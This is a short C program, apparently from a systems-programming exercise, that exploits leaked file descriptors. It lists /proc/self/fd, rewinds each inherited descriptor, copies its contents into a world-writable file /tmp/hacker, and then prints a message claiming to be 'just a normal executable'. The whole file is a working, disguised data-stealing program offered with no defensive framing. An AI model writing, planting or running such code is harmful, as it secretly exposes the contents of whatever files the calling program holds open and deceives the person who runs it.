#include "csapp.h"
#include <dirent.h>

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  DIR *dir = opendir("/proc/self/fd");
  struct dirent* fd;
  while(fd=readdir(dir))
  {
    int fdnum=atoi(fd->d_name);
    if(fdnum<4 || fdnum==dirfd(dir)) continue;
    char fn[255]={};
    char fdlink[255]={};
    strcpy(fdlink, "/proc/self/fd/");
    strcat(fdlink, fd->d_name);
    readlink(fdlink, fn, 255);
    dprintf(out, "File descriptor %d is '%s' file!\n", fdnum, fn);
    char buf[255]={};
    int bytes;
    lseek(fdnum, 0, SEEK_SET);
    while((bytes=read(fdnum, buf, 255))>0)
    {
      // printf("Read %d bytes\n", bytes);
      write(out, buf, bytes);
    }
  }
  closedir(dir);
  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
